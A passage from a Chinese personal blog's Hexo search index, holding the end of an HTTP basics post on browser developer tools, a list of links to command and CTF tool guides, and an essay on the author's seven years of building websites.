href="https://www.baidu.com)./">https://www.baidu.com）。</a></p></li><li><p>按F12打开开发者工具，切换至<strong>Network</strong>（网络）面板。</p></li><li><p>勾选面板左上角的“Preserve log”（保留日志），避免页面刷新后请求丢失。</p></li><li><p>在网页中进行操作（如输入关键词搜索），Network面板会显示所有请求记录。</p></li><li><p>点击任意一条请求记录，右侧会显示该请求的详细信息：<br> <strong>Headers</strong>：查看请求行、请求头、响应行、响应头。</p></li><li><p><strong>Payload</strong>：查看请求体参数（POST请求）。</p></li><li><p><strong>Response</strong>：查看响应体内容（如HTML代码、JSON数据）。</p></li><li><p><strong>Timings</strong>：查看请求各阶段的耗时（如DNS解析、TCP连接、数据传输）。</p></li></ol><p>实战技巧：通过Filter（筛选器）输入“XHR”可快速定位异步请求（如AJAX请求），便于查看接口的请求&#x2F;响应数据。</p><h1 id="六、核心总结"><a href="#六、核心总结" class="headerlink" title="六、核心总结"></a>六、核心总结</h1><ol><li><p>BS架构的核心是“浏览器-服务器”的远程交互，依赖HTTP&#x2F;HTTPS协议实现通信。</p></li><li><p>请求包是“需求载体”，包含请求行（方法、URL、版本）、请求头（附加信息）、请求体（参数数据），用于明确告诉服务器“要什么”。</p></li><li><p>返回包是“结果载体”，包含响应行（版本、状态码）、响应头（解析信息）、响应体（核心数据），用于告诉浏览器“处理结果是什么”。</p></li><li><p>浏览器的核心作用是“封装请求+解析响应”，服务器的核心作用是“解析请求+生成响应”，二者通过请求包和返回包完成闭环交互。</p><blockquote><p>（注：文档部分内容可能由 AI 生成）</p></blockquote></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>常用资源汇总</title>
    <link href="/2025/11/01/%E5%B8%B8%E7%94%A8%E8%B5%84%E6%BA%90%E6%B1%87%E6%80%BB/"/>
    <url>/2025/11/01/%E5%B8%B8%E7%94%A8%E8%B5%84%E6%BA%90%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="常用资源汇总"><a href="#常用资源汇总" class="headerlink" title="常用资源汇总"></a>常用资源汇总</h1><p>由于本人脑子不好使，经常忘一些东西，故写篇文章汇总一些资源以便随时使用。</p><h2 id="命令类"><a href="#命令类" class="headerlink" title="命令类"></a>命令类</h2><p>1.<a href="https://blog.csdn.net/qq_65810953/article/details/149875496">Git</a><br>2.<a href="https://jamcz.com/tutorial/wanji/">fastboot</a><br>3.<a href="https://www.bilibili.com/opus/511489935913435333">ADB</a> </p><h2 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h2><p>1.<a href="https://blog.csdn.net/m0_60571842/article/details/132402668">Arjun</a></p><p>2.<a href="https://blog.csdn.net/qq_44005305/article/details/146025669">【干货】sqlmap常用命令整理_sqlmap常用指令和参数-CSDN博客</a></p><h2 id="技巧类"><a href="#技巧类" class="headerlink" title="技巧类"></a>技巧类</h2><p>1.<a href="https://blog.csdn.net/A1_3_9_7/article/details/153739403">CTF实战解题思路</a></p>]]></content>
    
    
    <categories>
      
      <category>汇总</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>我的七年建站之路：从初入江湖到站点终成</title>
    <link href="/2025/08/16/%E6%88%91%E7%9A%84%E4%B8%83%E5%B9%B4%E5%BB%BA%E7%AB%99%E4%B9%8B%E8%B7%AF%EF%BC%9A%E4%BB%8E%E5%88%9D%E5%85%A5%E6%B1%9F%E6%B9%96%E5%88%B0%E7%AB%99%E7%82%B9%E7%BB%88%E6%88%90/"/>
    <url>/2025/08/16/%E6%88%91%E7%9A%84%E4%B8%83%E5%B9%B4%E5%BB%BA%E7%AB%99%E4%B9%8B%E8%B7%AF%EF%BC%9A%E4%BB%8E%E5%88%9D%E5%85%A5%E6%B1%9F%E6%B9%96%E5%88%B0%E7%AB%99%E7%82%B9%E7%BB%88%E6%88%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2025年8月9日，我期待已久的个人博客网站终于正式落成——也就是你此刻正在浏览的这一个。回望这些年与个人网站相伴的探索时光，初一那年第一次输入网址、成功打开属于自己网页时的雀跃与激动，至今仍清晰如昨。这份跨越七年的热爱与坚持，值得用一篇文字记录下来，与每一位同样对建站感兴趣的朋友分享我的成长与感悟。</p><h2 id="初出茅庐：HTML-Github-Pages，手写代码的纯粹热爱"><a href="#初出茅庐：HTML-Github-Pages，手写代码的纯粹热爱" class="headerlink" title="初出茅庐：HTML+Github Pages，手写代码的纯粹热爱"></a>初出茅庐：HTML+Github Pages，手写代码的纯粹热爱</h2><p>初一刚接触HTML时，我曾为一个问题困惑许久：明明照着书写好了网页代码，却始终不知道怎样才能让它变成“输入网址就能访问”的样子。直到后来才明白，想要让网页被他人看到，必须搭建属于自己的服务器。</p><p>那时的我既没有额外的预算，也不懂服务器配置，偶然发现的Github Pages成了最佳选择——无需付费，也不用复杂设置，就能让静态网页上线。我的第一个“可访问网站”，就是靠着“手搓HTML文件”一点点完成的：从调整标签结构到修改样式，每一行代码都要手动敲写，过程繁琐却充满成就感。当终于能在浏览器输入网址，看到自己写的页面加载出来时，那种纯粹的满足感，成了我坚持建站的最初动力。</p><h2 id="崭露头角：WordPress-服务器，解锁“可视化”建站"><a href="#崭露头角：WordPress-服务器，解锁“可视化”建站" class="headerlink" title="崭露头角：WordPress+服务器，解锁“可视化”建站"></a>崭露头角：WordPress+服务器，解锁“可视化”建站</h2><p>初三时，一次偶然的机会，学校社团租用了一台亚马逊云服务器。对建站早已痴迷的我，自然不会错过这个“升级装备”的机会——这次我选择了WordPress（后端由好友libfsx协助搭建），彻底告别了“纯手写代码”的时代。</p><p>相比于需要逐行编写的HTML，WordPress的优势显而易见：它自带成熟的博客框架，无需从零开发；通过后台就能轻松配置主题、安装插件，无论是调整页面风格，还是添加评论、统计等功能，都能“可视化操作”；更重要的是，它搭载了账号系统和数据库——管理员不用登录服务器，在前端后台就能修改网页内容；还能给朋友开放“作者账号”，让他们一起发文；普通游客也能注册账号留言互动。</p><p><img src="https://pic1.imgdb.cn/item/68a1e04d58cb8da5c82b2441.png" alt="当年没截图，这里用lovestu的网站演示一下WordPress"></p><p>不过，好景不长——云服务器的费用并不低，后来我又尝试过虚拟主机、实体主机+内网穿透，但对于一个“没什么访问量、纯属自娱自乐”的个人博客来说，这些方案要么成本太高，要么配置复杂。最终，历时两年的WordPress探索之路，还是遗憾地告一段落。</p><h2 id="驾轻就熟：Hexo-Github-Pages，回归轻量化创作"><a href="#驾轻就熟：Hexo-Github-Pages，回归轻量化创作" class="headerlink" title="驾轻就熟：Hexo+Github Pages，回归轻量化创作"></a>驾轻就熟：Hexo+Github Pages，回归轻量化创作</h2><p>中考结束后，终于有了大把时间研究建站。这时，好友libfsx给我推荐了Hexo——一个轻量级的静态博客框架。一试之下，我便立刻被它吸引，也由此开启了<a href="bobrocket.github.io">软核实验室</a>这个站点的雏形。</p><p>相比于WordPress的“全能型”，Hexo的“轻量化”恰好契合了我的需求：它采用“源码+输出HTML”的模式，本地写完内容后，只需一条命令就能将生成的静态文件部署到Github Pages上，无需维护数据库，加载速度更快；更重要的是，Hexo支持Markdown语法——对于习惯用Markdown写笔记、记思路的我来说，用它写博客就像“写笔记一样轻松”，不用再操心排版，专注于内容本身即可。这种“回归创作本质”的体验，让我在建站这件事上，第一次有了“驾轻就熟”的感觉。</p><p><img src="https://pic1.imgdb.cn/item/68a1df8958cb8da5c82b2406.png" alt="软核实验室"></p><h2 id="炉火纯青：Hexo-EdgeOne，解决访问速度“最后一公里”"><a href="#炉火纯青：Hexo-EdgeOne，解决访问速度“最后一公里”" class="headerlink" title="炉火纯青：Hexo+EdgeOne，解决访问速度“最后一公里”"></a>炉火纯青：Hexo+EdgeOne，解决访问速度“最后一公里”</h2><p>本以为Hexo+Github Pages的组合已经足够完美，直到一次意外打乱了节奏——因为手机刷机、电脑系统重装，我不小心弄丢了Github账号的两步验证码，之前的站点配置也随之丢失。无奈之下，只能“推倒重来”。</p><p>但这次重建，我不想只做“简单复刻”——一直以来，Github Pages在国内的访问速度较慢，这是我心中的一个小遗憾。于是，在重新搭建站点时，我把“提速”作为核心目标。一番研究后，我将目光投向了腾讯云的EdgeOne：原本只是想试试它的CDN加速功能，却意外发现了“EdgeOne Pages”这个新特性——它能将静态资源部署到腾讯云的边缘节点，用户访问时会自动匹配最近的节点加载内容，网页响应速度比单纯用Github Pages快了不止一个档次。</p><p><img src="https://pic1.imgdb.cn/item/68a1df2c58cb8da5c82b23ed.png" alt="腾讯云的控制台"></p><p>从“解决访问问题”到“优化体验细节”，这次重建不仅让我找回了之前的站点内容，更让我的建站思路从“能用就行”升级到“好用、易用”。当看到新站点在手机、电脑上都能快速加载，之前的遗憾彻底被弥补时，我才真正觉得，我的七年建站之路，终于走到了“炉火纯青”的阶段。</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>回望这七年的建站之路，从初一第一次敲写HTML的懵懂，到如今站点终成的从容，每一步都离不开身边朋友的支持。特别感谢<a href="https://blog.libfsx.org/">libfsx</a>——无论是最初的WordPress后端搭建，还是后来推荐Hexo，他都给了我太多技术上的帮助；感谢卢戦和Wing·Francis·Smith，在我遇到难题时耐心倾听、陪我一起排查问题。</p><p>没有你们的陪伴与支持，就没有今天这个“suny”的个人博客。而这份与代码、与站点相伴的热爱，也会继续陪我走下去，未来还有更多可能，等待被探索。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
